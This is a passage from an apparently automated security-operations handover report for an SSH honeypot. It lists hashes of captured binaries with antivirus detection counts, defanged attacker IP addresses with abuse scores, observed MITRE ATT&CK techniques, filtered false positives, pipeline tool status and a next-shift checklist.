| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `150.95.25[.]34` | TH | ZCOM THAI | **100** ⚠️ | 0 |
| `23.111.14[.]189` | SG | Leaseweb Asia Pacific pte. ltd. | **100** ⚠️ | 50 |
| `212.73.148[.]37` | SG | NL MODAT | **100** ⚠️ | 50 |
| `45.119.212[.]99` | VN | Branch of Long Van System Solution JSC - Hanoi | **100** ⚠️ | 50 |
| `174.76.38[.]124` | US | Cox Communications Inc. | **100** ⚠️ | 23 |
| `35.233.209[.]148` | US | Google LLC | **100** ⚠️ | 0 |
| `202.165.15[.]132` | MY | TM ONE Cloud Alpha Edge | **100** ⚠️ | 50 |
| `78.44.192[.]210` | CZ | Vodafone Broadband Internet Services | **100** ⚠️ | 50 |
| `135.148.14[.]151` | US | Chirag, Patel | **100** ⚠️ | 1 |
| `40.124.172[.]78` | US | Microsoft Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 177 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 123 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 23 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 7 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 590 cases |
| Tool 34  | Credential Extractor        | ✅ 146 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 25 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (1.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 23 priority case(s) shown individually · 15 recon entry/entries in table (10 group(s) consolidating 551 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-10T22:53:50Z_
